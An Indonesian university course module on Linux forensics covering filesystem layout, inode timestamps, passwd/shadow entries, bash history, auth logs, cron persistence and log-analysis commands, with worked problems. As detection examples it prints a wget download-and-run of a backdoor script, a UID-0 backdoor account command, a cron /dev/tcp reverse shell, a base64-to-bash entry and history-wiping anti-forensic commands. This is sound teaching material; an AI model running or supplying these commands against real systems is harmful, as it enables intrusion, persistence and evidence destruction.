# Modul 07: Forensik Linux dan Pengenalan Mac OS

**Mata Kuliah:** Digital Forensic for Military Purposes (Forensik Digital untuk Keperluan Militer)  
**SKS:** 3 SKS  
**Pertemuan:** 07  
**Topik:** Forensik Linux dan Pengenalan Mac OS  
**Pengampu:** Anindito, S.Kom., S.S., S.H., M.TI., CHFI  

---

## Tujuan Pembelajaran

Setelah menyelesaikan modul ini, mahasiswa diharapkan mampu:

1. Menjelaskan arsitektur sistem file Linux dan struktur direktori yang relevan secara forensik
2. Mengidentifikasi dan menganalisis artefak forensik utama pada sistem Linux (/var/log, /etc/passwd, /etc/shadow)
3. Mengekstraksi dan menginterpretasi bash history serta command line artifacts
4. Memahami sistem autentikasi Linux dan menganalisis audit logs
5. Menganalisis scheduled tasks (cron jobs dan systemd timers) untuk mendeteksi aktivitas mencurigakan
6. Melakukan analisis log files Linux (syslog, auth.log, kern.log) secara komprehensif
7. Memahami konsep dasar forensik Mac OS termasuk arsitektur APFS, plist files, dan unified logs

---

## 1. Arsitektur Sistem File Linux

### 1.1 Filesystem Hierarchy Standard (FHS)

> **Filesystem Hierarchy Standard (FHS)** adalah spesifikasi yang mendefinisikan struktur direktori dan isi direktori pada sistem operasi Linux/Unix. Pemahaman terhadap FHS sangat penting bagi investigator forensik karena menentukan di mana artefak-artefak kunci berada.

Berbeda dengan Windows yang menggunakan drive letter (C:\, D:\), Linux menggunakan sistem hierarki tunggal yang berakar pada root directory (`/`). Setiap file dan direktori dalam sistem operasi Linux berada di bawah hierarki ini, termasuk perangkat keras yang direpresentasikan sebagai file di `/dev`.

| Direktori | Fungsi | Relevansi Forensik |
|-----------|--------|-------------------|
| **/** | Root filesystem | Titik awal seluruh investigasi |
| **/etc** | File konfigurasi sistem | User accounts, password hashes, konfigurasi jaringan |
| **/var** | Data variabel (logs, spool) | Log aktivitas, mail spool, database |
| **/home** | Direktori pengguna | Dokumen, bash history, konfigurasi aplikasi |
| **/tmp** | File sementara | Artefak malware, file eksfiltrasi sementara |
| **/root** | Home directory root | Aktivitas administrator/superuser |
| **/usr** | Program dan data user-space | Aplikasi terinstal, shared libraries |
| **/proc** | Pseudo-filesystem proses | Informasi proses berjalan (live forensics) |
| **/sys** | Pseudo-filesystem kernel | Informasi perangkat keras dan kernel |
| **/dev** | File perangkat | Representasi media penyimpanan |
| **/boot** | File boot loader | Kernel images, konfigurasi GRUB |
| **/opt** | Software opsional pihak ketiga | Aplikasi non-standar, tools custom |

#### 1.1.1 Sistem File Linux yang Umum

Dalam konteks forensik, investigator perlu memahami berbagai jenis sistem file yang digunakan pada Linux:

1. **ext4 (Fourth Extended Filesystem)**: Sistem file default pada sebagian besar distribusi Linux modern. Mendukung journaling, extent-based allocation, dan timestamps hingga nanosecond. Kapasitas maksimum 1 exabyte dengan file individual hingga 16 TB.

2. **ext3**: Pendahulu ext4, masih ditemukan pada server legacy. Mendukung journaling namun dengan fitur lebih terbatas dibanding ext4.

3. **XFS**: Sistem file high-performance dari SGI, digunakan sebagai default di RHEL/CentOS 7+. Sangat efisien untuk file besar dan operasi paralel.

4. **Btrfs (B-tree Filesystem)**: Sistem file modern dengan fitur copy-on-write, snapshots, dan built-in RAID. Digunakan sebagai default di SUSE Linux Enterprise.

5. **ZFS**: Awalnya dikembangkan Sun Microsystems, menawarkan integritas data tinggi dengan checksumming dan self-healing. Digunakan di Ubuntu untuk konfigurasi tertentu.

| Sistem File | Journal | Max File Size | Fitur Forensik Penting |
|-------------|---------|---------------|----------------------|
| **ext4** | Ya | 16 TB | Deleted file recovery, journal analysis, timestamps (crtime) |
| **ext3** | Ya | 2 TB | Journal recovery, inode analysis |
| **XFS** | Ya (metadata) | 8 EB | Extent-based analysis, delayed allocation |
| **Btrfs** | Ya (CoW) | 16 EB | Snapshot forensics, subvolume analysis |
| **ZFS** | Ya (CoW) | 16 EB | Checksum verification, snapshot analysis |

![Arsitektur Filesystem Hierarchy Standard Linux](images/p07-01-linux-fhs-structure.png)

*Gambar 7.1: Struktur direktori Linux berdasarkan Filesystem Hierarchy Standard*

#### 1.1.2 Inode dan Metadata pada Linux

Setiap file dan direktori di Linux direpresentasikan oleh sebuah **inode** (index node). Inode menyimpan metadata penting yang sangat bernilai dalam investigasi forensik:

| Metadata Inode | Deskripsi | Relevansi Forensik |
|----------------|-----------|-------------------|
| **Inode number** | Nomor unik identifikasi | Identifikasi file meskipun telah di-rename |
| **File type** | Regular, directory, symlink, dll. | Klasifikasi objek yang ditemukan |
| **Permissions** | rwx untuk owner/group/others | Deteksi privilege escalation |
| **Owner (UID)** | User ID pemilik file | Atribusi aktivitas ke pengguna |
| **Group (GID)** | Group ID file | Analisis akses berbasis grup |
| **File size** | Ukuran dalam bytes | Deteksi anomali (file yang tidak wajar) |
| **atime** | Access time (terakhir diakses) | Timeline kapan file dibaca |
| **mtime** | Modify time (konten diubah) | Timeline kapan file dimodifikasi |
| **ctime** | Change time (metadata diubah) | Deteksi perubahan permission/ownership |
| **crtime** | Creation time (ext4) | Waktu pembuatan file asli |
| **Link count** | Jumlah hard links | Deteksi file tersembunyi via hard link |
| **Block pointers** | Lokasi data di disk | Recovery data dan carving |

> **Catatan Penting:** Pada ext4, terdapat empat timestamp (atime, mtime, ctime, crtime) yang sangat berguna untuk membuat timeline forensik. Timestamp `crtime` (creation time) hanya tersedia pada ext4 dan tidak ada pada ext3 atau sistem file Linux lama.

Perintah `stat` digunakan untuk menampilkan semua informasi inode:

```bash
$ stat /var/log/auth.log
  File: /var/log/auth.log
  Size: 85420      Blocks: 168        IO Block: 4096   regular file
Device: 801h/2049d  Inode: 262148      Links: 1
Access: (0640/-rw-r-----)  Uid: (  104/  syslog)   Gid: (    4/     adm)
Access: 2026-01-15 08:30:15.123456789 +0700
Modify: 2026-01-15 08:30:12.987654321 +0700
Change: 2026-01-15 08:30:12.987654321 +0700
 Birth: 2026-01-01 00:00:01.000000000 +0700
```

#### Solved Problem 1 ⭐

**Soal:** Sebutkan empat direktori Linux yang memiliki prioritas tertinggi untuk investigasi forensik dan jelaskan alasannya!

**Penyelesaian:**

*Step 1:* Identifikasi direktori berdasarkan nilai forensik

*Step 2:* Analisis konten masing-masing direktori

| No | Direktori | Alasan Prioritas Tinggi |
|----|-----------|------------------------|
| 1 | **/var/log** | Menyimpan seluruh log sistem termasuk auth.log (autentikasi), syslog (aktivitas sistem), dan kern.log (kernel). Log ini merekam hampir semua aktivitas pada sistem. |
| 2 | **/etc** | Berisi file konfigurasi kritis seperti /etc/passwd (akun pengguna), /etc/shadow (hash password), dan /etc/crontab (scheduled tasks). |
| 3 | **/home** | Menyimpan data pengguna termasuk .bash_history (riwayat perintah), dokumen, browser data, dan file konfigurasi aplikasi per pengguna. |
| 4 | **/tmp dan /var/tmp** | Sering digunakan oleh malware untuk menyimpan payload sementara karena direktori ini writable oleh semua pengguna dan jarang dipantau. |

**Jawaban:** Empat direktori prioritas tertinggi adalah: (1) /var/log yang berisi log aktivitas sistem, (2) /etc yang menyimpan konfigurasi dan data akun, (3) /home yang berisi data dan riwayat aktivitas pengguna, dan (4) /tmp yang sering dieksploitasi oleh malware sebagai staging area.

---

#### Solved Problem 2 ⭐

**Soal:** Jelaskan perbedaan antara empat timestamp pada inode ext4 (atime, mtime, ctime, crtime) dan berikan contoh masing-masing dalam konteks forensik!

**Penyelesaian:**

*Step 1:* Definisi setiap timestamp

*Step 2:* Kontekstualisasi dalam skenario forensik

| Timestamp | Nama | Berubah Ketika | Contoh Forensik |
|-----------|------|----------------|-----------------|
| **atime** | Access time | File dibaca/diakses | Investigator mendeteksi kapan dokumen rahasia terakhir dibuka |
| **mtime** | Modify time | Konten file berubah | Menentukan kapan konfigurasi firewall dimodifikasi oleh penyerang |
| **ctime** | Change time | Metadata file berubah (permission, ownership) | Mendeteksi kapan permission file diubah untuk privilege escalation |
| **crtime** | Creation time | Tidak pernah berubah setelah dibuat | Menentukan kapan file malware pertama kali ditempatkan di sistem |

**Jawaban:** Keempat timestamp memberikan informasi berbeda: atime mencatat akses terakhir, mtime mencatat modifikasi konten, ctime mencatat perubahan metadata, dan crtime (khusus ext4) mencatat waktu pembuatan asli file. Kombinasi keempat timestamp ini memungkinkan investigator membangun timeline aktivitas yang akurat.

---

### 1.2 Mount Points dan Partisi

Dalam investigasi forensik Linux, pemahaman tentang bagaimana partisi di-mount sangat penting. File `/etc/fstab` mendefinisikan konfigurasi mount yang persisten:

```bash
# /etc/fstab - contoh konfigurasi
UUID=a1b2c3d4-e5f6...  /         ext4    errors=remount-ro  0  1
UUID=f7e8d9c0-b1a2...  /home     ext4    defaults           0  2
UUID=1a2b3c4d-5e6f...  /var      ext4    defaults           0  2
UUID=9z8y7x6w-5v4u...  none      swap    sw                 0  0
/dev/sdb1               /backup   xfs     noauto,user        0  0
```

Investigator harus memeriksa `/etc/fstab` untuk memahami layout penyimpanan dan mengidentifikasi partisi tambahan yang mungkin berisi bukti. Partisi yang di-mount secara non-standar atau penggunaan mount options yang tidak biasa (seperti `noatime` atau `noexec`) dapat menjadi indikator aktivitas mencurigakan.

Perintah `mount` atau `cat /proc/mounts` pada sistem hidup menampilkan mount point aktif, termasuk filesystem yang di-mount secara dinamis oleh pengguna.

---

## 2. Artefak Forensik Linux

### 2.1 File Konfigurasi Pengguna (/etc/passwd dan /etc/shadow)

File `/etc/passwd` dan `/etc/shadow` merupakan artefak fundamental dalam forensik Linux yang menyimpan informasi akun pengguna.

#### 2.1.1 Struktur /etc/passwd

File `/etc/passwd` dapat dibaca oleh semua pengguna dan memiliki format kolom yang dipisahkan oleh karakter titik dua (`:`):

```
username:x:UID:GID:GECOS:home_directory:shell
```

Contoh isi file:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
tniadmin:x:1000:1000:Admin TNI Kodam:/home/tniadmin:/bin/bash
operator01:x:1001:1001:Operator Sistem:/home/operator01:/bin/bash
temp_user:x:1002:1002::/home/temp_user:/bin/bash
```

| Field | Contoh | Signifikansi Forensik |
|-------|--------|----------------------|
| **Username** | `tniadmin` | Identifikasi akun yang terlibat |
| **Password** | `x` (shadow) | Verifikasi penggunaan shadow passwords |
| **UID** | `0` = root | UID 0 di luar root = backdoor potensial |
| **GID** | `1000` | Analisis keanggotaan grup |
| **GECOS** | `Admin TNI Kodam` | Informasi identitas pengguna |
| **Home** | `/home/tniadmin` | Lokasi data pengguna |
| **Shell** | `/bin/bash` | `/usr/sbin/nologin` = akun layanan |

> **Red Flag Forensik:** Akun dengan UID 0 selain root adalah indikator kuat adanya backdoor. Akun dengan shell valid (`/bin/bash`) tetapi tidak ada di GECOS field juga mencurigakan.

#### 2.1.2 Struktur /etc/shadow

File `/etc/shadow` hanya dapat dibaca oleh root dan menyimpan hash password:

```
username:$hash:lastchg:min:max:warn:inactive:expire:reserved
```

Contoh:

```
root:$6$xyz123$ABCdef....:19500:0:99999:7:::
tniadmin:$6$salt$HashedPassword:19480:0:90:14:30:19800:
operator01:$y$j9T$salt$hash:19490:0:60:7:14::
temp_user:!:19495:0:99999:7:::
```

| Field | Deskripsi | Nilai Forensik |
|-------|-----------|---------------|
| **Hash algorithm** | `$6$` = SHA-512, `$y$` = yescrypt | Identifikasi kekuatan hash |
| **Last changed** | Hari sejak epoch (1 Jan 1970) | Kapan password terakhir diubah |
| **Min/Max days** | Batas umur password | Policy compliance check |
| **Expire date** | Tanggal kadaluarsa akun | Akun yang seharusnya sudah nonaktif |
| **!** atau **\*** | Akun terkunci/disabled | Verifikasi status akun |

> **Analisis Forensik:** Konversi field "last changed" ke tanggal: `19500 × 86400` detik sejak 1 Jan 1970 = tanggal kalender. Perintah `chage -l username` menampilkan informasi ini dalam format readable.

![Analisis File /etc/passwd dan /etc/shadow](images/p07-02-passwd-shadow-analysis.png)

*Gambar 7.2: Struktur dan analisis forensik file /etc/passwd dan /etc/shadow*

#### Solved Problem 3 ⭐

**Soal:** Pada file `/etc/passwd`, ditemukan entry berikut: `sysbackup:x:0:0::/tmp:/bin/bash`. Apa yang mencurigakan dari entry ini?

**Penyelesaian:**

*Step 1:* Parse field-field entry tersebut

| Field | Nilai | Analisis |
|-------|-------|----------|
| Username | `sysbackup` | Terlihat seperti akun layanan backup |
| Password | `x` | Menggunakan shadow file |
| **UID** | **0** | **KRITIS: UID 0 = hak akses root** |
| GID | 0 | Grup root |
| GECOS | (kosong) | Tidak ada informasi identitas |
| **Home** | **/tmp** | **MENCURIGAKAN: Home directory di /tmp** |
| Shell | `/bin/bash` | Shell interaktif aktif |

*Step 2:* Identifikasi red flags

**Jawaban:** Entry ini memiliki tiga indikator backdoor: (1) **UID 0** berarti akun ini memiliki hak akses root penuh — hanya akun root yang seharusnya memiliki UID 0, (2) **Home directory /tmp** menunjukkan upaya penyembunyian karena /tmp sering dibersihkan secara otomatis, dan (3) **GECOS kosong** menunjukkan akun dibuat tanpa identitas yang jelas. Ini sangat mungkin merupakan backdoor account yang disisipkan oleh penyerang.

---

### 2.2 Bash History dan Command Line Artifacts

Bash history merupakan salah satu artefak paling bernilai dalam forensik Linux karena merekam perintah-perintah yang diketikkan pengguna.

#### 2.2.1 Lokasi Bash History

```bash
# Lokasi default
/home/<username>/.bash_history    # Untuk user biasa
/root/.bash_history               # Untuk root

# File konfigurasi yang mempengaruhi bash history
/home/<username>/.bashrc          # Konfigurasi per-user
/home/<username>/.bash_profile    # Login shell config
/etc/bash.bashrc                  # Konfigurasi global
```

#### 2.2.2 Variabel Lingkungan yang Mempengaruhi History

| Variabel | Default | Deskripsi | Relevansi Forensik |
|----------|---------|-----------|-------------------|
| `HISTFILE` | `~/.bash_history` | Lokasi file history | Jika diubah, history mungkin tersembunyi |
| `HISTSIZE` | 1000 | Jumlah perintah di memori | Menentukan kapasitas history aktif |
| `HISTFILESIZE` | 2000 | Jumlah baris di file | Menentukan data historis yang tersimpan |
| `HISTCONTROL` | - | Kebijakan penyimpanan | `ignorespace` = perintah diawali spasi tidak disimpan |
| `HISTIGNORE` | - | Pola yang diabaikan | Perintah tertentu tidak dicatat |
| `HISTTIMEFORMAT` | - | Format timestamp | Jika diset, setiap perintah memiliki timestamp |

> **Teknik Anti-Forensik Bash History:**
> - `unset HISTFILE` — History tidak ditulis ke file
> - `HISTSIZE=0` — Menonaktifkan history
> - `export HISTCONTROL=ignorespace` — Perintah diawali spasi tidak dicatat
> - `history -c && history -w` — Menghapus history aktif dan menulisnya ke file (kosong)
> - `shred ~/.bash_history` — Menghapus secara aman file history

#### 2.2.3 Analisis Bash History

Contoh isi `.bash_history` yang menunjukkan aktivitas mencurigakan:

```bash
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow
find / -name "*.conf" -type f 2>/dev/null
wget http://malicious-server.com/backdoor.sh -O /tmp/.hidden_script
chmod +x /tmp/.hidden_script
/tmp/.hidden_script &
iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
useradd -o -u 0 -g 0 -M -d /tmp -s /bin/bash sysbackup
history -c
```

Pola aktivitas di atas menunjukkan: (1) reconnaissance (`whoami`, `id`, `uname`), (2) enumeration (`cat /etc/passwd`), (3) download malware (`wget`), (4) eksekusi backdoor, (5) modifikasi firewall untuk membuka port, (6) pembuatan backdoor account, dan (7) penghapusan jejak (`history -c`).

#### Solved Problem 4 ⭐

**Soal:** Investigator menemukan bahwa file `.bash_history` seorang user di server Kodam berukuran 0 byte. Apa kemungkinan penyebabnya dan langkah apa yang harus diambil?

**Penyelesaian:**

*Step 1:* Identifikasi kemungkinan penyebab

1. **Penghapusan disengaja** — User menjalankan `history -c && history -w` atau `> ~/.bash_history`
2. **Anti-forensik** — `HISTFILE=/dev/null` atau `unset HISTFILE` di `.bashrc`
3. **File baru dibuat** — Akun baru yang belum pernah digunakan
4. **Log rotation** — Script otomatis yang membersihkan history

*Step 2:* Tentukan langkah investigasi lanjutan

**Jawaban:** File `.bash_history` berukuran 0 byte merupakan indikator potensial penghapusan jejak. Langkah yang harus diambil: (1) Periksa timestamps inode file menggunakan `stat` — jika mtime lebih baru dari crtime, file kemungkinan telah di-overwrite, (2) Periksa `.bashrc` dan `.bash_profile` untuk konfigurasi yang menonaktifkan history, (3) Cari artefak kompensasi di syslog dan auth.log yang mungkin mencatat perintah via sudo, (4) Lakukan file carving pada unallocated space untuk menemukan history yang terhapus, dan (5) Periksa journal ext4 untuk entry yang terkait dengan file history.

---

#### Solved Problem 5 ⭐

**Soal:** Apa perbedaan antara shell bash, sh, dan zsh dari perspektif forensik? Di mana masing-masing menyimpan history?

**Penyelesaian:**

*Step 1:* Identifikasi lokasi artefak setiap shell

| Shell | File History | File Konfigurasi | Catatan Forensik |
|-------|-------------|-----------------|-----------------|
| **bash** | `~/.bash_history` | `~/.bashrc`, `~/.bash_profile` | Shell default pada sebagian besar distro Linux |
| **sh (dash)** | Tidak ada history file default | `~/.profile` | Sering digunakan untuk scripts, minimal artifacts |
| **zsh** | `~/.zsh_history` | `~/.zshrc` | Default di macOS Catalina+; history dengan timestamps bawaan |
| **fish** | `~/.local/share/fish/fish_history` | `~/.config/fish/` | Format YAML, termasuk timestamps |
| **csh/tcsh** | `~/.history` | `~/.cshrc` | Ditemukan pada sistem BSD lama |

**Jawaban:** Setiap shell menyimpan history di lokasi berbeda. Bash menggunakan `~/.bash_history`, zsh di `~/.zsh_history` (dengan timestamps bawaan), sedangkan sh biasanya tidak menyimpan history. Investigator harus memeriksa field shell di `/etc/passwd` untuk menentukan shell yang digunakan setiap user, kemudian mencari file history yang sesuai. Perubahan shell dari default juga bisa menjadi indikator bahwa user berusaha menghindari logging standar.

---

### 2.3 Sistem Autentikasi Linux dan Audit Logs

#### 2.3.1 PAM (Pluggable Authentication Modules)

Linux menggunakan PAM sebagai framework autentikasi yang modular. File konfigurasi PAM terletak di `/etc/pam.d/` dan mengontrol bagaimana autentikasi dilakukan untuk setiap layanan.

```bash
# /etc/pam.d/sshd - konfigurasi autentikasi SSH
auth       required     pam_sepermit.so
auth       include      common-auth
account    required     pam_nologin.so
account    include      common-account
session    include      common-session
session    optional     pam_motd.so
password   include      common-password
```

Modifikasi pada file PAM dapat menunjukkan upaya bypass autentikasi. Misalnya, penambahan modul `pam_permit.so` yang selalu mengizinkan akses tanpa password.

#### 2.3.2 Auth.log dan Secure Log

File log autentikasi merupakan sumber utama untuk mendeteksi aktivitas login yang mencurigakan:

| Distribusi | Lokasi Log Autentikasi | Format |
|------------|----------------------|--------|
| Debian/Ubuntu | `/var/log/auth.log` | Syslog |
| RHEL/CentOS | `/var/log/secure` | Syslog |
| Systemd-based | `journalctl -u sshd` | Binary journal |

Contoh entry auth.log:

```
Jan 15 08:30:15 server01 sshd[12345]: Accepted publickey for tniadmin from 192.168.1.100 port 52341 ssh2
Jan 15 08:31:02 server01 sudo:  tniadmin : TTY=pts/0 ; PWD=/home/tniadmin ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jan 15 09:15:44 server01 sshd[12400]: Failed password for invalid user admin from 10.0.0.55 port 43210 ssh2
Jan 15 09:15:45 server01 sshd[12401]: Failed password for invalid user admin from 10.0.0.55 port 43211 ssh2
Jan 15 09:15:46 server01 sshd[12402]: Failed password for invalid user root from 10.0.0.55 port 43212 ssh2
```

#### Solved Problem 6 ⭐⭐

**Soal:** Dari log auth.log berikut, identifikasi jenis serangan yang terjadi dan tentukan tindakan yang harus diambil:

```
Feb 10 03:14:01 kodam-srv sshd[8801]: Failed password for root from 203.0.113.50 port 41001 ssh2
Feb 10 03:14:02 kodam-srv sshd[8802]: Failed password for root from 203.0.113.50 port 41002 ssh2
Feb 10 03:14:03 kodam-srv sshd[8803]: Failed password for admin from 203.0.113.50 port 41003 ssh2
Feb 10 03:14:04 kodam-srv sshd[8804]: Failed password for admin from 203.0.113.50 port 41004 ssh2
...
Feb 10 03:14:55 kodam-srv sshd[8850]: Accepted password for operator01 from 203.0.113.50 port 41050 ssh2
Feb 10 03:15:10 kodam-srv sudo: operator01 : TTY=pts/1 ; PWD=/home/operator01 ; USER=root ; COMMAND=/bin/bash
```

**Penyelesaian:**

*Step 1:* Analisis pola log

| Observasi | Detail |
|-----------|--------|
| IP sumber | 203.0.113.50 (IP eksternal) |
| Waktu | 03:14 - 03:15 (dini hari) |
| Pola | Multiple failed attempts diikuti satu keberhasilan |
| Username target | root, admin, lalu berhasil di operator01 |
| Post-access | Escalation ke root via sudo |

*Step 2:* Identifikasi serangan

**Jawaban:** Log menunjukkan **brute-force SSH attack** yang berhasil. Indikatornya: (1) Banyak percobaan gagal dari IP yang sama dalam waktu singkat (41 detik), (2) Percobaan terhadap multiple username (dictionary attack), (3) Keberhasilan login pada akun `operator01` setelah banyak kegagalan, (4) Waktu serangan dini hari menunjukkan upaya menghindari deteksi, (5) Eskalasi privilege segera setelah berhasil login. Tindakan: isolasi server, reset semua password, blokir IP 203.0.113.50, audit aktivitas operator01 pasca-login, dan periksa apakah penyerang memasang backdoor.

---

### 2.4 Scheduled Tasks: Cron Jobs dan Systemd Timers

Scheduled tasks sering dieksploitasi oleh penyerang untuk mempertahankan persistence pada sistem yang dikompromikan.

#### 2.4.1 Cron Jobs

Cron adalah scheduler tradisional di Linux. Lokasi konfigurasi cron:

| Lokasi | Fungsi | Akses |
|--------|--------|-------|
| `/etc/crontab` | Crontab sistem utama | Root |
| `/etc/cron.d/` | Crontab tambahan sistem | Root |
| `/etc/cron.daily/` | Script harian | Root |
| `/etc/cron.hourly/` | Script per jam | Root |
| `/etc/cron.weekly/` | Script mingguan | Root |
| `/etc/cron.monthly/` | Script bulanan | Root |
| `/var/spool/cron/crontabs/` | Crontab per-user | User masing-masing |

Format entry crontab:

```
# m   h  dom mon dow user  command
*/5   *   *   *   *  root  /usr/local/bin/backup.sh
0     2   *   *   *  root  /opt/scripts/maintenance.sh
```

Contoh cron job mencurigakan:

```
# Entry normal
0 2 * * * root /usr/sbin/logrotate /etc/logrotate.conf

# Entry mencurigakan - reverse shell setiap 5 menit
*/5 * * * * root bash -i >& /dev/tcp/10.0.0.99/4444 0>&1

# Entry mencurigakan - encoded command
*/10 * * * * root echo "YmFzaCAtaSA..." | base64 -d | bash
```

#### 2.4.2 Systemd Timers

Pada distribusi modern yang menggunakan systemd, timer units menjadi alternatif cron:

```bash
# Melihat semua timer aktif
systemctl list-timers --all

# Lokasi file timer
/etc/systemd/system/    # Timer custom (prioritas tinggi)
/lib/systemd/system/    # Timer dari paket
/run/systemd/system/    # Runtime timers
```

Contoh file timer:

```ini
# /etc/systemd/system/backup.timer
[Unit]
Description=Daily Backup Timer

[Timer]
OnCalendar=daily
Persistent=true

[Install]
WantedBy=timers.target
```

#### Solved Problem 7 ⭐⭐

**Soal:** Investigator menemukan entry berikut di `/var/spool/cron/crontabs/www-data`:

```
*/3 * * * * /tmp/.cache/update.sh > /dev/null 2>&1
```

Analisis entry ini dan jelaskan mengapa entry ini mencurigakan!

**Penyelesaian:**

*Step 1:* Parse format crontab

| Field | Nilai | Arti |
|-------|-------|------|
| Menit | `*/3` | Setiap 3 menit |
| Jam | `*` | Setiap jam |
| Hari | `*` | Setiap hari |
| Bulan | `*` | Setiap bulan |
| Hari minggu | `*` | Setiap hari |
| Command | `/tmp/.cache/update.sh` | Script yang dieksekusi |
| Redirect | `> /dev/null 2>&1` | Output dibuang |

*Step 2:* Identifikasi indikator mencurigakan

**Jawaban:** Entry ini mencurigakan karena: (1) **User www-data** — akun web server seharusnya tidak memerlukan cron job, (2) **Lokasi /tmp/.cache/** — direktori tersembunyi (diawali titik) di /tmp, lokasi yang sering digunakan malware, (3) **Nama file 'update.sh'** — nama generik yang dirancang untuk tidak menarik perhatian, (4) **Frekuensi */3** — eksekusi setiap 3 menit menunjukkan command & control beaconing atau persistence mechanism, (5) **Output ke /dev/null** — upaya menyembunyikan output eksekusi. Ini adalah indikator kuat adanya web shell atau backdoor yang mempertahankan akses via cron persistence.

---

## 3. Analisis Log Files Linux

### 3.1 Arsitektur Logging Linux

Linux memiliki sistem logging yang komprehensif. Pada distribusi modern, terdapat dua sistem logging yang berjalan bersamaan:

1. **rsyslog/syslog-ng** — Traditional text-based logging
2. **systemd-journald** — Binary journal logging (journalctl)

#### 3.1.1 Syslog Format

Format standar syslog:

```
<priority>timestamp hostname process[PID]: message
```

Contoh:

```
Jan 15 10:30:15 kodam-srv kernel: [12345.678] USB device connected
```

Priority syslog menggabungkan **facility** dan **severity**:

| Facility | Kode | Deskripsi |
|----------|------|-----------|
| kern | 0 | Kernel messages |
| user | 1 | User-level messages |
| mail | 2 | Mail system |
| daemon | 3 | System daemons |
| auth | 4 | Security/authorization |
| authpriv | 10 | Private auth messages |
| local0-7 | 16-23 | Custom facilities |

| Severity | Kode | Deskripsi |
|----------|------|-----------|
| emerg | 0 | Sistem tidak dapat digunakan |
| alert | 1 | Tindakan segera diperlukan |
| crit | 2 | Kondisi kritis |
| err | 3 | Error |
| warning | 4 | Peringatan |
| notice | 5 | Normal tapi signifikan |
| info | 6 | Informasi |
| debug | 7 | Debug messages |

#### 3.1.2 File Log Utama

| File Log | Isi | Relevansi Forensik |
|----------|-----|-------------------|
| `/var/log/syslog` | Pesan sistem umum | Overview aktivitas sistem |
| `/var/log/auth.log` | Autentikasi (login, sudo, ssh) | Deteksi unauthorized access |
| `/var/log/kern.log` | Kernel messages | Deteksi USB device, driver loading |
| `/var/log/dmesg` | Boot-time kernel messages | Hardware changes, module loading |
| `/var/log/dpkg.log` | Package installation | Software installation timeline |
| `/var/log/apt/history.log` | APT package manager | Package installation/removal |
| `/var/log/faillog` | Login failures (binary) | Brute-force detection |
| `/var/log/lastlog` | Last login per user (binary) | User activity tracking |
| `/var/log/wtmp` | Login/logout records (binary) | Session analysis |
| `/var/log/btmp` | Failed login attempts (binary) | Brute-force analysis |

![Arsitektur Logging pada Linux](images/p07-03-linux-logging-architecture.png)

*Gambar 7.3: Arsitektur logging Linux dengan syslog dan systemd-journald*

### 3.2 Teknik Analisis Log dengan Command Line

Investigator forensik menggunakan berbagai perintah command line untuk menganalisis log pada Linux:

#### 3.2.1 grep — Pattern Searching

```bash
# Mencari login gagal dari IP tertentu
grep "Failed password" /var/log/auth.log | grep "203.0.113.50"

# Mencari aktivitas sudo
grep "sudo:" /var/log/auth.log

# Mencari akses SSH berhasil
grep "Accepted" /var/log/auth.log

# Mencari dengan regular expression - IP address pattern
grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" /var/log/auth.log
```

#### 3.2.2 awk — Field Processing

```bash
# Menghitung jumlah login gagal per IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Ekstrak timestamp dan username dari login berhasil
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, $9, "from", $11}'
```

#### 3.2.3 sed, cut, dan sort

```bash
# Menghitung event per jam
cat /var/log/syslog | cut -d' ' -f1-3 | cut -d':' -f1 | sort | uniq -c

# Menghapus duplikat dan menghitung
cat /var/log/auth.log | sed -n '/Failed/p' | sort | uniq -c | sort -rn | head -20
```

#### 3.2.4 journalctl — Systemd Journal

```bash
# Melihat log sejak waktu tertentu
journalctl --since "2026-01-15 00:00:00" --until "2026-01-15 23:59:59"

# Filter berdasarkan unit
journalctl -u sshd.service

# Melihat log kernel
journalctl -k

# Export ke format JSON untuk analisis
journalctl -o json --since today > journal_export.json
```

#### Solved Problem 8 ⭐⭐

**Soal:** Tuliskan perintah one-liner untuk menganalisis file `/var/log/auth.log` dan menampilkan 10 IP address dengan percobaan login gagal terbanyak!

**Penyelesaian:**

*Step 1:* Breakdown logika perintah

1. Filter baris yang mengandung "Failed password" → `grep`
2. Ekstrak field IP address → `awk` atau `grep -oE`
3. Hitung kemunculan setiap IP → `sort | uniq -c`
4. Urutkan dari terbanyak → `sort -rn`
5. Ambil 10 teratas → `head -10`

*Step 2:* Susun perintah

```bash
grep "Failed password" /var/log/auth.log | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort | uniq -c | sort -rn | head -10
```

**Jawaban:** Perintah di atas bekerja sebagai berikut: `grep "Failed password"` memfilter hanya baris login gagal, `grep -oE` mengekstrak IP address menggunakan regex, `sort` mengurutkan IP secara alfabet agar `uniq -c` dapat menghitung kemunculan berurutan, `sort -rn` mengurutkan berdasarkan jumlah secara descending, dan `head -10` membatasi output ke 10 IP teratas. Alternatif dengan awk: `grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10`.

---

#### Solved Problem 9 ⭐

**Soal:** File `/var/log/wtmp` dan `/var/log/btmp` menyimpan data dalam format binary. Bagaimana cara membaca kedua file ini dan apa perbedaan informasi yang dikandungnya?

**Penyelesaian:**

*Step 1:* Identifikasi tools untuk membaca file binary log

| File | Perintah | Informasi |
|------|----------|-----------|
| `/var/log/wtmp` | `last -f /var/log/wtmp` | History login/logout berhasil |
| `/var/log/btmp` | `lastb -f /var/log/btmp` | History login yang gagal |
| `/var/log/lastlog` | `lastlog` | Login terakhir setiap user |

*Step 2:* Contoh output

```bash
# Output dari 'last' (wtmp)
tniadmin pts/0   192.168.1.100  Wed Jan 15 08:30   still logged in
root     tty1                   Tue Jan 14 22:00 - 23:45  (01:45)

# Output dari 'lastb' (btmp)
admin    ssh:notty  10.0.0.55   Wed Jan 15 09:15 - 09:15  (00:00)
root     ssh:notty  10.0.0.55   Wed Jan 15 09:15 - 09:15  (00:00)
```

